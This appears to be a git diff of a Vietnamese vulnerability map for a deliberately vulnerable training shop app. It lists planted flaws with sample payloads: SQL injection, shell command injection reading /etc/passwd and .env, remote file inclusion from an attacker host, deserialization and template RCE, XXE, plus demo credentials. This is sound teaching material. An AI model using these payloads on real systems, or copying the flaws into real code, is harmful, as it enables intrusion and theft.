@@ -1,211 +1,171 @@
-# VULNS.md — Bản đồ 75 lỗ hổng trong VulnShop
+# VULNS.md — Bản đồ 135 lỗ hổng trong VulnPC Shop
 
-Mỗi lỗ hổng đánh dấu `[VULN #N]` ngay trong code. Payload dùng được với domain
-frontend (qua Cloudflare Pages) hoặc thẳng backend `https://<backend>.onrender.com`.
+Mỗi lỗ hổng đánh dấu `[VULN #N]` ngay trong code. Payload chạy được với domain frontend
+(qua Cloudflare Pages) hoặc thẳng backend `https://<backend>.onrender.com`.
 
-Chú thích: **[code]** = lỗi được cài đặt thật, khai thác được; **[config]** = cấu hình yếu có chủ đích; **[doc]** = chỉ tài liệu/kịch bản (không thể cài trong app).
-
-| # | Lỗ hổng | Điểm lỗi | Payload / cách khai thác mẫu |
-|---|---------|----------|------------------------------|
-| 1 | SQL Injection **[code]** | `GET /api/products/search?q=`, `/api/products/sort?col=`, `POST /api/auth/register` (email/role), `GET /api/auth/login` (email), `GET /api/legacy/me?session=`, `PUT /api/profile` (tên cột), GraphQL `user(id)` | `?q=%' OR 1=1--` · `?q=%' UNION SELECT 1, email, password_hash, 0, 0, 'x' FROM users--` · `?col=price;SELECT pg_sleep(5)--` |
-| 2 | NoSQL Injection **[code]** | `POST /api/products/filter` (mini-Mongo evaluator) | `{"price":{"$ne":null}}` · `{"$where":"this.price<100"}` (eval) · `{"name":{"$regex":"^R"}}` |
-| 3 | Command Injection **[code]** | `GET /api/utils/ping?host=` | `?host=127.0.0.1;id` · `?host=$(whoami)` · `?host=1%0awhoami` |
-| 4 | OS Command Injection **[code]** | `POST /api/admin/exec {cmd}` (+ `GET /api/utils/disk?dir=`) | `{"cmd":"id; cat /etc/passwd"}` · `?dir=.;cat /app/.env` |
-| 5 | LDAP Injection **[code]** | `POST /api/ldap/bind`, `/api/ldap/search` (directory ảo) | `{"uid":"*","password":"*"}` (login mọi user) · filter `(&(objectClass=person)(uid=*))` |
-| 6 | XML Injection **[code]** | `POST /api/products/wishlist` → `GET /api/products/export/xml`; `POST /api/xml/echo` | wishlist name `x</name></wishlist><product id="999"><name>PWNED` — phá cấu trúc XML export |
-| 7 | XPath Injection **[code]** | `GET /api/products/xpath?q=` | `?q=x" \|\| "1"=="1` (trả toàn bộ records + secret) |
-| 8 | XSS (reflected + stored) **[code]** | Home reflected `?q=` (dangerouslySetInnerHTML); comments; profile signature | comment `<img src=x onerror=alert(1)>` (đã seed sẵn) · `?q=<img src=x onerror=alert(1)>` |
-| 9 | CSRF **[code]** | `GET /api/orders/transfer` (state-changing GET, cookie SameSite=None, no token) | mở `/csrf-demo.html` khi đã login legacy → auto transfer |
-| 10 | SSRF **[code]** | `GET /api/net/fetch?url=` (response trả về attacker) | `?url=http://169.254.169.254/latest/meta-data/` · `?url=http://127.0.0.1:6379/` |
-| 11 | IDOR **[code]** | `GET /api/orders/:id` (không check ownership) | đổi id tuần tự `/orders/1`, `/orders/2`... |
-| 12 | Broken Access Control **[code]** | `/api/admin/*` gate chỉ là client-side + static token + `X-Original-URL` middleware | header `x-admin-token: admin-token-123` (lộ ở `/api/debug/config`) · `X-Original-Url: /api/admin/stats` |
-| 13 | Privilege Escalation **[code]** | gate tin `x-user-role` header; `PUT /api/profile` cho tự set role/is_admin | header `x-user-role: admin` · `PUT /api/profile {"role":"admin","is_admin":true}` |
-| 14 | Authentication Bypass **[code]** | LDAP `*` login; SAML không kiểm tra chữ ký; JWT decode-no-verify; adminBypass gadget | `POST /api/ldap/bind {"uid":"*","password":"*"}` · `POST /api/saml/consume` với assertion tự chế |
-| 15 | Broken Authentication **[code]** | MD5 password, token random Math.random, token trong URL, reset không hết hạn | xem #44/#45/#66 |
-| 16 | Session Hijacking **[code]** | cookie `session` không HttpOnly/Secure; `GET /api/legacy/me?session=` | đánh cắp token qua XSS → `?session=<token>` từ máy khác |
-| 17 | Session Fixation **[code]** | `POST /api/auth/login` nhận `sessionId` từ body | set cookie trước bằng id mình biết → đăng nhập nạn nhân bằng id đó |
-| 18 | Session Replay **[code]** | `/api/auth/replay/issue` + `/verify` — HMAC-md5, không expiry/nonce | dùng lại token đã issue vô thời hạn |
-| 19 | Brute Force **[code]** | `/api/auth/login` — chỉ rate limit 5/phút (bypass được #52), không lockout | script thử password phổ biến |
-| 20 | Credential Stuffing **[code]** | cùng endpoint, không captcha/không phát hiện reuse | đăng nhập bằng list leaked creds |
-| 21 | Password Spraying **[code]** | password policy yếu + message phân biệt | thử `admin123`, `password123`, `1` trên nhiều account |
-| 22 | Directory Traversal **[code]** | `GET /api/files/download?name=` | `?name=../../../../etc/passwd` · `?name=/etc/passwd` |
-| 23 | LFI **[code]** | `GET /api/files/read?page=` | `?page=../../../../etc/passwd` · `?page=../../package.json` |
-| 24 | RFI **[code]** | cùng endpoint — URL http(s) được fetch rồi **eval** | `?page=https://<attacker>/pwn.js` với nội dung `require('child_process').execSync('id').toString()` |
-| 25 | Arbitrary File Upload **[code]** | `POST /api/files/upload` — giữ nguyên tên (có `../`), không check nội dung | upload `shell.html` chứa `<script>alert(document.cookie)</script>` → mở `/uploads/shell.html` |
-| 26 | Unrestricted File Upload **[code]** | cùng endpoint — không extension/MIME allowlist | `.php.jpg`, `.svg` (script chạy khi mở trực tiếp), file .bat/.exe... |
-| 27 | RCE **[code]** | `POST /api/utils/eval`, eval trong `$where`, eval RFI, SSTI, unserialize | `{"code":"require('child_process').execSync('id').toString()"}` |
-| 28 | Insecure Deserialization **[code]** | `POST /api/utils/unserialize` (node-serialize style) | `{"payload":"{\"rce\":\"_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()\"}"}` |
-| 29 | XXE **[code]** | `POST /api/xml/parse {xml}` — parser tự viết hỗ trợ external entity | `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>` · billion laughs (cap 1MB) |
-| 30 | SSTI **[code]** | `GET /api/orders/export?tpl=` (lodash template, imports `require`) | `?tpl=<%= require("child_process").execSync("id").toString() %>` |
-| 31 | Client-Side Template Injection **[code]** | trang Product — chữ ký compile bằng `_.template` trong browser | `<%= constructor.constructor("alert(document.domain)")() %>` |
-| 32 | Open Redirect **[code]** | `GET /api/net/redirect?url=` | `?url=https://evil.tld/phish` |
-| 33 | HTTP Request Smuggling **[config]** | `backend/nginx/app.conf`: proxy HTTP/1.1, giữ Connection/TE từ client, đổi max body — lỗi framing kiểu CL.TE khi ghép proxy | gửi request 2 lần `Content-Length` / `Transfer-Encoding: chunked` đè lẫn qua gateway |
-| 34 | HTTP Response Splitting **[code]** | `GET /api/net/jump?to=` | `?to=x%0d%0aSet-Cookie:%20pwned=1` (Node mới từ chối → stack leak; trên stack cũ/proxy → split thật) |
-| 35 | Host Header Injection **[code]** | `POST /api/auth/forgot` — link reset dựng từ `X-Forwarded-Host` | `curl -X POST -H "X-Forwarded-Host: evil.tld" -d '{"email":"victim@vulnshop.local"}' /api/auth/forgot` |
-| 36 | CRLF / Log Injection **[code]** | logger ghi User-Agent thô; xem tại `GET /api/admin/logs` | `curl -A "$(printf 'x\n[admin] LOGIN admin@vulnshop.local password=xxx')"` → log giả |
-| 37 | Cache Poisoning **[code]** | `GET /api/net/echo-headers` phản chiếu `X-Forwarded-Host`, `Cache-Control: public` + CF Cache Rule | `curl -H "X-Forwarded-Host: evil.tld" https://site/api/net/echo-headers` → cache toàn site chứa assetBase độc |
-| 38 | Web Cache Deception **[code]** | `GET /api/cache/profile/:anything.css` — profile JSON + `Cache-Control: public` | khi login: mở `/api/cache/profile/abc.css` → profile bị cache ở URL đó, ai cũng đọc được |
-| 39 | Clickjacking **[config]** | thiếu `X-Frame-Options`/`frame-ancestors` ở nginx + CSP meta | mở `/clickjack-demo.html` |
-| 40 | CORS Misconfiguration **[code]** | middleware CORS reflect mọi Origin + credentials | `curl -H "Origin: https://evil.tld" -i /api/v2/users` → `Access-Control-Allow-Origin: https://evil.tld` + credentials |
-| 41 | CSP Misconfiguration **[config]** | meta CSP `default-src * 'unsafe-inline' 'unsafe-eval'`; endpoint `/api/csp-demo` | payload script inline chạy tự do |
-| 42 | Security Misconfiguration **[code]** | `/api/docs` (route map), `/api/debug/config`, GraphiQL public, nginx `server_tokens on`, autoindex `/uploads/`, stack traces, error chi tiết | mở `/api/docs`, `https://site/graphql` (GraphiQL IDE), `/uploads/` (listing) |
-| 43 | Information Disclosure **[code]** | stack trong mọi error response, SQL echo, đường dẫn tuyệt đối, internal_cost, sourcemap prod | `GET /api/debug/error?msg=x` · `/api/products/search?q='` (SQL error) |
-| 44 | Sensitive Data Exposure **[code]** | `/api/auth/me`, `/api/legacy/me`, `/api/v2/users`, JWT login response — password_hash MD5, cc_number, api_key | `GET /api/v2/users` (không auth) |
-| 45 | Cryptographic Failures **[code]** | MD5 hash, Math.random token, HMAC-md5, key cố định | `/api/utils/token`, `/api/crypto/hash?text=admin123` → crack offline |
-| 46 | Weak Password Policy **[code]** | register/login chấp nhận password 1 ký tự | `POST /api/auth/register {"email":"a@b.c","password":"1"}` |
-| 47 | Weak Encryption **[code]** | AES-128-**ECB** key cứng; MD5/SHA1; base64 | `/api/crypto/encrypt?text=...` — deterministic, malleable |
-| 48 | Insecure API **[code]** | tổng hợp: over-fetching (full row), verbose error, no versioning, GET đổi state, GraphQL BOLA | xem các mục liên quan |
-| 49 | BOLA **[code]** | `GET /api/coupons/list?owner=`, `GET /api/v2/orders/:uuid`, GraphQL `user(id)` | `?owner=legacy-victim-2` · graphql `{"query":"{user(id:\"legacy-victim-2\"){email passwordHash}}"}` |
-| 50 | BFLA **[code]** | `POST /api/v2/admin/delete-user`, `GET /api/v2/users` — **không auth** | `curl -X POST -d '{"id":"legacy-admin-1"}' /api/v2/admin/delete-user` |
-| 51 | Mass Assignment **[code]** | `PUT /api/profile` — `Object.keys(req.body)` ghi thẳng vào DB | `{"role":"admin","is_admin":true,"balance":999999}` |
-| 52 | Rate Limiting Bypass **[code]** | limiter key = header `X-Forwarded-For` | mỗi request 1 XFF mới: `for i in $(seq 1 50); do curl -H "X-Forwarded-For: 1.2.3.$i" ...; done` |
-| 53 | Race Condition **[code]** | `POST /api/coupon/redeem` — check-then-act, sleep 150ms giữa check/update | bắn 10 request song song cùng lúc (nút **Race x8** trong app) — coupon VULN50 max 1 lần dùng được pass nhiều lần |
-| 54 | Business Logic **[code]** | `POST /api/orders` tin `price` client, qty âm; transfer số âm; coupon không per-user | `{"productId":1,"qty":1,"price":0}` mua 0đ · `{"qty":-100}` total âm · transfer `amount=-1000` tự cộng tiền |
-| 55 | DNS Rebinding **[code]** | `GET /api/net/fetch` không chặn IP private/định danh lại IP sau resolve | domain attacker trỏ A 1.1.1.1 → rebinding sang 169.254.169.254 |
-| 56 | Subdomain Takeover **[doc]** | thêm CNAME `old-api` → project Pages chưa tồn tại (docs/DEPLOY.md Bước 6) | claim project `vulnshop-gone.pages.dev` để takeover |
-| 57 | Prototype Pollution **[code]** | `POST /api/utils/merge` — merge không lọc `__proto__`; gadget = `config.adminBypass` | `{"__proto__":{"adminBypass":true}}` → mọi `/api/admin/*` mở (check `/api/admin/stats` không header) |
-| 58 | DOM Clobbering **[code]** | trang `/domxss` — gadget `window.config.allow` | `#<form id=config><input name=allow></form><img src=x onerror=alert(1)>` |
-| 59 | DOM-based XSS **[code]** | trang `/domxss` — hash → innerHTML khi safe-mode bị clobber | cùng payload #58 |
-| 60 | WebSocket Vulnerabilities **[code]** | `/ws/chat` — không Origin check (CSWSH), không auth, broadcast raw, client render innerHTML | kết nối ws từ trang khác domain; gửi `<img src=x onerror=alert(1)>` |
-| 61 | JWT Vulnerabilities **[code]** | secret `jwt-secret-123` (lộ ở `/api/debug/config`); `/api/auth/jwt/whoami` dùng `jwt.decode` | tự ký token `{"sub":"legacy-admin-1","role":"admin"}` với secret lộ → whoami chấp nhận |
-| 62 | OAuth Misconfiguration **[code]** | `/api/oauth/authorize` không validate `redirect_uri`, không check `state`, implicit flow, token endpoint không client auth | `?redirect_uri=https://example.com` → code rơi ra ngoài; nút demo ở `/oauth-demo` |
-| 63 | SAML Vulnerabilities **[code]** | `POST /api/saml/consume` — chấp nhận assertion **không kiểm tra chữ ký**, tự tạo user | base64 assertion với NameID tuỳ ý (`/api/saml/sample` làm mẫu) |
-| 64 | GraphQL Vulnerabilities **[code]** | `/graphql` — introspection on, GraphiQL public, no depth limit (cycle User→orders→User), BOLA, SQLi trong resolver | `{user(id:"legacy-admin-1"){email passwordHash orders{total buyer{email}}}}` · query lồng sâu 1000 tầng → DoS |
-| 65 | Web Cache Poisoning **[code]** | như #37 + `/api/cache/store/:key` cacheable | poison header → cache key chung |
-| 66 | Password Reset Vulnerabilities **[code]** | token = md5(email), không expiry, reusable, response trả token, link theo Host header | `POST /api/auth/forgot {"email":"admin@vulnshop.local"}` → token `md5(email)` tính offline; `GET /api/auth/reset?token=...&password=newpass` |
-| 67 | Account Enumeration **[code]** | login 404 vs 401; register 409; `GET /api/enumerate?email=` | `?email=admin@vulnshop.local` → `{"exists":true}` |
-| 68 | Email Spoofing **[code]** | `POST /api/contact` — From do client truyền (recipient cố định = owner) | `{"from":"ceo@company.tld","subject":"Urgent","message":"..."}` |
-| 69 | MIME Sniffing **[code]** | `/uploads-sniff/:name` trả `text/plain` không `nosniff` | upload `x.html` → mở `/uploads-sniff/x.html` → browser sniff → render HTML/JS |
-| 70 | Insecure HTTP Headers **[config]** | nginx không set HSTS/XFO/nosniff/CSP; thêm `X-Powered-By`, `Referrer-Policy: unsafe-url` | `curl -I https://site/` kiểm tra |
-| 71 | TLS/SSL Misconfiguration **[doc]** | Render/Cloudflare quản TLS — không thể cấu hình sai; kịch bản lab: TLS 1.0/weak cipher nếu self-managed | dùng testssl.sh khi có domain riêng |
-| 72 | Dependency Vulnerabilities **[code]** | `jsonwebtoken@8.5.1`, `lodash@4.17.15` (CVE prototype pollution) — `npm audit` đỏ cố ý (CI cho phép) | `cd backend && npm audit` |
-| 73 | Supply Chain **[doc]** | kịch bản: typosquatting, postinstall script, dependency confusion — CI có bước `npm audit` | soi lockfile + `npm ls` khi thêm package lạ |
-| 74 | DoS **[code]** | ReDoS `GET /api/utils/regex?q=` (`/^(a\|a?)+$/`, đo thực tế: 24×'a'+b ≈ 0.6s, 30×'a'+b ≈ 76s block event loop), JSON body limit 50MB, multipart 20MB, `$where`/`$regex` eval | `?q=` + N ký tự `a` + `b` — N càng lớn event loop càng khoá lâu |
-| 75 | DDoS **[doc]** | là kịch bản tấn công — phòng thủ bằng Cloudflare; không có code DDoS trong app | kịch bản lab: flood `/api/utils/regex` từ nhiều source; CF rate limit/rule là phòng thủ |
-
-## Endpoint nhanh
-
-```
-GET  /health                                  (không lỗi — cho Render health check)
-GET  /api/docs                                map mọi route (#42)
-POST /auth/signup, /auth/signin               Supertokens (chuẩn, email+password)
-POST /api/auth/login|register                 legacy auth lỗi (#1,#15-21,#45-46,#67)
-POST /api/auth/forgot, GET /api/auth/reset    reset lỗi (#35,#66)
-GET  /api/auth/jwt/whoami                     JWT decode-no-verify (#61)
-GET  /api/orders/:id                          IDOR (#11)
-GET  /api/orders/transfer                     CSRF GET (#9)
-POST /api/coupon/redeem                       race (#53)
-GET  /api/orders/export?tpl=                  SSTI (#30)
-GET  /api/products/search|sort                SQLi (#1)
-POST /api/products/filter                     NoSQLi (#2)
-GET  /api/products/xpath                      XPath (#7)
-POST /api/ldap/bind|search                    LDAP (#5)
-POST /api/xml/parse                           XXE (#29)
-GET  /api/files/download|read, /uploads/*     traversal/LFI/RFI (#22-24), upload (#25-26), sniff (#69)
-GET  /api/utils/ping|disk|regex|token         cmdi (#3-4), ReDoS (#74), token yếu (#45)
-POST /api/utils/eval|unserialize|merge        RCE (#27), deser (#28), pollution (#57)
-GET  /api/net/fetch|redirect|jump|echo-headers SSRF (#10), redirect (#32), split (#34), cache (#37)
-GET  /api/cache/profile/:x.css                cache deception (#38)
-GET  /api/admin/* + POST /api/admin/exec      gate yếu (#12/#13), cmdi (#4), logs (#36)
-POST /api/v2/admin/delete-user, GET /api/v2/users  BFLA (#50)
-POST /api/contact                             email spoof (#68)
-GET  /api/enumerate                           enum (#67)
-GET  /api/debug/config|error, /api/headers    disclosure (#42/#43), headers (#70)
-POST /graphql (GraphiQL GET)                  GraphQL (#64)
-POST /api/saml/consume                        SAML (#63)
-GET  /api/oauth/authorize|callback            OAuth (#62)
-WS   /ws/chat                                 WebSocket (#60)
-```
-
-## Lưu ý ethical
-
-- Chỉ khai thác trên **instance của chính bạn**. Domain `.onrender.com`/`.pages.dev` là của bạn — quét/xâm nhập hệ thống người khác là vi phạm luật.
-- Bot internet sẽ tìm thấy app trong vài phút nếu public: đó là một phần của bài học. Tắt service khi không dùng.
-- `SMTP_PASS`, `DATABASE_URL` thật **không** nằm trong git (Render env only); endpoint `/api/debug/config` chỉ mask các giá trị này.
+Tài khoản demo: Supertokens (đăng ký tại `/auth`), legacy staff `admin@vulnpc.local/admin123`,
+`victim@vulnpc.local/victim123`. Coupon: `WELCOME10`, `PCLOVE50` (1 lần), `BLACKFRIDAY20`.
 
 ---
 
-# Phần 2 — 60 lỗ hổng Frontend (Client-side)
+# Phần 1 — 75 lỗ hổng Web/Backend
 
-Bảng dưới map mỗi lỗi → trang demo trong app. Các trang mới: `/storage`, `/injection`, `/redirects`,
-`/clientauth`, `/postmessage`, `/workers`, `/leaks`, `/pathdos`, `/cache`, `/supply`
-(hiển thị trong nav phần "client-side labs").
+| # | Lỗ hổng | Tính năng / điểm lỗi | Payload mẫu |
+|---|---------|----------------------|-------------|
+| 1 | SQL Injection **[code]** | Tìm kiếm/Cửa hàng `GET /api/products/search?q=&category=&sortcol=`; login legacy (email); đăng ký (email/role); `PUT /api/profile` (tên cột); wishlist `?owner=`; GraphQL `user(id)/products(category)` | `?q=%' OR 1=1--` · `?q=%' UNION SELECT 1, email, password_hash, 'x', 'user', 0, 0, 0, FALSE, 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x' FROM users--` · `?sortcol=price;SELECT pg_sleep(5)--` |
+| 2 | NoSQL Injection **[code]** | "Bộ lọc nâng cao" ở Cửa hàng `POST /api/products/filter`; Build PC `POST /api/builds/compat` | `{"price":{"$lt":600}}` · `{"$where":"this.price<100"}` (eval) · `{"name":{"$regex":"^R"}}` |
+| 3 | Command Injection (ứng dụng) **[code]** | endpoint ping `GET /api/utils/ping?host=` — payload qua shell metachar | `?host=$(whoami)` · `?host=1%0awhoami` |
+| 4 | OS Command Injection **[code]** | Admin "⚙ exec diagnostics" `POST /api/admin/exec {cmd}`; `GET /api/utils/ping?host=`; `GET /api/utils/disk?dir=` | `{"cmd":"id; cat /etc/passwd"}` · `?host=127.0.0.1;id` |
+| 5 | LDAP Injection **[code]** | Staff portal backend `POST /api/ldap/bind`, `/api/ldap/search` | `{"uid":"*","password":"*"}` |
+| 6 | XML Injection **[code]** | Wishlist "Xuất XML" `GET /api/wishlist/export/xml` (note raw) | wishlist note `x</note></item><item id="999"><note>PWNED` |
+| 7 | XPath Injection **[code]** | `GET /api/products/xpath?q=` | `?q=x" \|\| "1"=="1` |
+| 8 | XSS (reflected+stored) **[code]** | Tìm kiếm (reflected `?q=`), Review sản phẩm, tin nhắn ticket | review `<img src=x onerror=alert(1)>` (đã seed) |
+| 9 | CSRF **[code]** | Ví chuyển tiền ở Hồ sơ: `GET /api/orders/transfer` + cookie SameSite=None | mở `/csrf-demo.html` khi đã login legacy |
+| 10 | SSRF **[code]** | `GET /api/net/fetch?url=` | `?url=http://169.254.169.254/latest/meta-data/` |
+| 11 | IDOR **[code]** | Đơn hàng `/orders/:id`, cart `PUT /api/cart/:id`, ticket `/support/:id`, build `/api/builds/:id` | đổi id tuần tự |
+| 12 | Broken Access Control **[code]** | Admin gate: static token + `X-Original-Url` middleware | header `x-admin-token: admin-token-123` · `X-Original-Url: /api/admin/stats` |
+| 13 | Privilege Escalation **[code]** | Hồ sơ: tự set role/is_admin; gate tin `x-user-role` | `PUT /api/profile {"role":"admin","is_admin":true}` |
+| 14 | Authentication Bypass **[code]** | LDAP `*`, SAML không verify, JWT decode-no-verify, adminBypass gadget | `POST /api/ldap/bind {"uid":"*","password":"*"}` |
+| 15 | Broken Authentication **[code]** | MD5, Math.random token, token trong URL, reset vô hạn | xem #44/#45/#66 |
+| 16 | Session Hijacking **[code]** | cookie `session` không HttpOnly; `GET /api/legacy/me?session=` | đọc qua XSS → dùng từ máy khác |
+| 17 | Session Fixation **[code]** | Staff portal login nhận `sessionId` | set cookie trước bằng id mình biết |
+| 18 | Session Replay **[code]** | `/api/auth/replay/issue` + `/verify` — HMAC-md5, không expiry/nonce | dùng lại token vô hạn |
+| 19 | Brute Force **[code]** | Staff login — rate limit 5/phút bypass được, không lockout | script thử password |
+| 20 | Credential Stuffing **[code]** | cùng endpoint, không captcha | list leaked creds |
+| 21 | Password Spraying **[code]** | policy yếu (1 ký tự) + message phân biệt | `admin123`, `password123`... |
+| 22 | Directory Traversal **[code]** | Hóa đơn `GET /api/orders/:id/invoice?file=`; `GET /api/files/download?name=` | `?file=../../../../etc/passwd` |
+| 23 | LFI **[code]** | `GET /api/files/read?page=` | `?page=../../../package.json` |
+| 24 | RFI **[code]** | cùng endpoint — URL http(s) được fetch + **eval** | `?page=https://attacker/pwn.js` |
+| 25 | Arbitrary File Upload **[code]** | Đính kèm ticket `POST /api/support/tickets/:id/attachment`; `/api/files/upload` — giữ nguyên tên | upload `shell.html` → mở `/uploads/shell.html` |
+| 26 | Unrestricted File Upload **[code]** | cùng endpoint — không extension/MIME allowlist | `.php.jpg`, `.svg`, `../../etc/x` |
+| 27 | RCE **[code]** | `POST /api/utils/eval`; eval trong `$where`; eval RFI; SSTI; unserialize | `{"code":"require('child_process').execSync('id').toString()"}` |
+| 28 | Insecure Deserialization **[code]** | `POST /api/utils/unserialize` (node-serialize style) | `{"payload":"{\"rce\":\"_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()\"}"}` |
+| 29 | XXE **[code]** | `POST /api/xml/parse {xml}` — parser tự viết | `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>` · billion laughs (cap 1MB) |
+| 30 | SSTI **[code]** | `GET /api/orders/export?tpl=` (lodash + `require`) | `?tpl=<%= require("child_process").execSync("id").toString() %>` |
+| 31 | CSTI **[code]** | Chữ ký review ở trang sản phẩm; tóm tắt Build PC — `_.template` trong browser | `<%= constructor.constructor("alert(document.domain)")() %>` |
+| 32 | Open Redirect **[code]** | Banner đối tác ở Trang chủ/Deals `GET /api/net/redirect?url=`; login `?next=` | `?url=https://evil.tld` |
+| 33 | HTTP Request Smuggling **[config]** | `backend/nginx/app.conf` — HTTP/1.1 + Connection/TE passthrough | request CL.TE đè lẫn qua gateway |
+| 34 | HTTP Response Splitting **[code]** | `GET /api/net/jump?to=` | `?to=x%0d%0aSet-Cookie:%20pwned=1` (Node mới throw → stack leak) |
+| 35 | Host Header Injection **[code]** | `POST /api/auth/forgot` — link từ `X-Forwarded-Host` | `curl -H "X-Forwarded-Host: evil.tld" -d '{"email":"victim@vulnpc.local"}' /api/auth/forgot` |
+| 36 | CRLF / Log Injection **[code]** | logger ghi User-Agent thô → `GET /api/admin/logs` | `curl -A "$(printf 'x\n[admin] LOGIN admin password=x')"` |
+| 37 | Cache Poisoning **[code]** | `GET /api/net/echo-headers` reflect `X-Forwarded-Host` + `Cache-Control: public` (+ CF Cache Rule) | `curl -H "X-Forwarded-Host: evil.tld" .../api/net/echo-headers` |
+| 38 | Web Cache Deception **[code]** | `GET /api/cache/profile/:anything.css` — profile JSON cacheable | khi login mở `/api/cache/profile/x.css` |
+| 39 | Clickjacking **[config]** | thiếu XFO/frame-ancestors | `/clickjack-demo.html` |
+| 40 | CORS Misconfiguration **[code]** | middleware reflect mọi Origin + credentials | `curl -H "Origin: https://evil.tld" -i /api/v2/users` |
+| 41 | CSP Misconfiguration **[config]** | meta CSP unsafe-inline/eval; `/api/csp-demo` | payload inline chạy tự do |
+| 42 | Security Misconfiguration **[code]** | `/api/docs`, `/internal` (config dump), GraphiQL public, nginx server_tokens, autoindex /uploads/, stack traces | mở `/api/docs`, `/graphql` |
+| 43 | Information Disclosure **[code]** | stack trong error, SQL echo, giá vốn, sourcemap prod, đường dẫn tuyệt đối | `/api/debug/error?msg=x` · search SQL error |
+| 44 | Sensitive Data Exposure **[code]** | `/api/auth/me`, `/api/legacy/me`, `/api/v2/users` — hash MD5, cc, api_key; checkout lưu cc plaintext | `GET /api/v2/users` (không auth) |
+| 45 | Cryptographic Failures **[code]** | MD5, Math.random, HMAC-md5, key cứng | `/api/utils/token`, `/api/crypto/hash?text=admin123` |
+| 46 | Weak Password Policy **[code]** | register/login chấp nhận 1 ký tự | `{"password":"1"}` |
+| 47 | Weak Encryption **[code]** | AES-128-**ECB** key cứng; MD5/SHA1 | `/api/crypto/encrypt?text=` |
+| 48 | Insecure API **[code]** | tổng hợp: over-fetching, verbose error, GET đổi state, GraphQL BOLA | xem các mục |
+| 49 | BOLA **[code]** | wishlist `?owner=`, `/api/v2/tickets/:id`, `/api/builds/:id`, GraphQL `user/builds` | `?owner=legacy-victim-2` |
+| 50 | BFLA **[code]** | `POST /api/v2/admin/delete-user`, `DELETE /api/v2/tickets/:id`, `/api/v2/builds/:id`, `GET /api/v2/users` | `curl -X POST -d '{"id":"legacy-admin-1"}' /api/v2/admin/delete-user` |
+| 51 | Mass Assignment **[code]** | `PUT /api/profile` — mọi key ghi thẳng DB (role, is_admin, balance, cc...) | `{"role":"admin","is_admin":true,"balance":999999}` |
+| 52 | Rate Limiting Bypass **[code]** | limiter key = `X-Forwarded-For` (staff portal có ô nhập) | đổi XFF mỗi request |
+| 53 | Race Condition **[code]** | `POST /api/coupon/redeem` — check-then-act sleep 150ms; nút double-submit ở Giỏ hàng, Race x8 ở Đơn hàng | bắn 8-10 request song song PCLOVE50 |
+| 54 | Business Logic **[code]** | checkout tin giá client; qty âm; transfer âm; coupon không per-user | `{"items":[{"productId":1,"qty":1,"unitPrice":0.01}]}` |
+| 55 | DNS Rebinding **[code]** | `/api/net/fetch` không chặn IP private | domain attacker rebinding → 169.254.169.254 |
+| 56 | Subdomain Takeover **[doc]** | DEPLOY.md Bước 6 — CNAME `old-api` → Pages chưa tồn tại | claim project trùng tên |
+| 57 | Prototype Pollution **[code]** | `POST /api/utils/merge` — gadget `config.adminBypass` mở admin gate | `{"__proto__":{"adminBypass":true}}` |
+| 58 | DOM Clobbering **[code]** | Nhập build từ link ở Build PC | `#<form id=config><input name=allow><img src=x onerror=alert(1)>` |
+| 59 | DOM-based XSS **[code]** | cùng chỗ — hash → innerHTML | như #58 |
+| 60 | WebSocket Vulnerabilities **[code]** | Live chat Support `/ws/chat` — không Origin check/auth, broadcast raw | `<img src=x onerror=alert(1)>` |
+| 61 | JWT Vulnerabilities **[code]** | secret `jwt-secret-123` (lộ /internal); whoami dùng `jwt.decode` | tự ký `{"sub":"legacy-admin-1","role":"admin"}` |
+| 62 | OAuth Misconfiguration **[code]** | Staff portal OAuth — redirect_uri không validate, không state, implicit | `?redirect_uri=https://example.com` |
+| 63 | SAML Vulnerabilities **[code]** | `POST /api/saml/consume` — không verify signature, tự tạo user | base64 assertion NameID tuỳ ý |
+| 64 | GraphQL Vulnerabilities **[code]** | `/graphql` — introspection, GraphiQL public, no depth limit (cycle), BOLA, SQLi | `{user(id:"legacy-admin-1"){email passwordHash}}` · `{builds{total owner{email}}}` |
+| 65 | Web Cache Poisoning **[code]** | như #37 + `/api/cache/store/:key` | poison header → cache chung |
+| 66 | Password Reset Vulnerabilities **[code]** | token = md5(email), không expiry, reusable, response lộ token | `POST /api/auth/forgot {"email":"admin@vulnpc.local"}` |
+| 67 | Account Enumeration **[code]** | login 404 vs 401; register 409; `/api/enumerate?email=` | `?email=admin@vulnpc.local` |
+| 68 | Email Spoofing **[code]** | Ticket "Nhận cập nhật qua email" + `/api/contact` — From do client | `{"from":"ceo@fake-bank.tld"}` |
+| 69 | MIME Sniffing **[code]** | `/uploads-sniff/:name` — text/plain không nosniff (trang Offline) | upload `shell.html` → iframe |
+| 70 | Insecure HTTP Headers **[config]** | nginx không HSTS/XFO/nosniff; `X-Powered-By`, `Referrer-Policy: unsafe-url` | `curl -I https://site/` |
+| 71 | TLS/SSL Misconfiguration **[doc]** | Render/CF quản TLS — kịch bản lab khi self-managed | testssl.sh |
+| 72 | Dependency Vulnerabilities **[code]** | `jsonwebtoken@8.5.1`, `lodash@4.17.15` — `npm audit` đỏ cố ý | `cd backend && npm audit` |
+| 73 | Supply Chain **[doc]** | kịch bản typosquatting/postinstall; CI có npm audit | `npm ls` |
+| 74 | DoS **[code]** | ReDoS `GET /api/utils/regex?q=` (24'a'≈0.6s, 30'a'≈76s block loop); JSON 50MB; multipart 20MB | `?q=` + N×'a'+'b' |
+| 75 | DDoS **[doc]** | kịch bản tấn công — phòng thủ bằng CF; không có code DDoS | flood /api/utils/regex |
 
-| # | Lỗ hổng | Nơi demo | Payload / cách khai thác mẫu |
-|---|---------|----------|------------------------------|
-| 1 | DOM-based XSS **[code]** | `/domxss` | `#<form id=config><input name=allow><img src=x onerror=alert(1)>` |
-| 2 | Reflected XSS **[code]** | `/` (search) | `?q=<img src=x onerror=alert(1)>` |
-| 3 | Stored XSS **[code]** | comments ở `/product/:id` | post `<img src=x onerror=alert(1)>` (đã seed sẵn trong DB) |
-| 4 | CSRF **[code]** | `/csrf-demo.html` + `GET /api/orders/transfer` | mở demo khi đã login legacy |
-| 5 | Clickjacking **[config]** | `/clickjack-demo.html` | iframe ẩn + nút overlay |
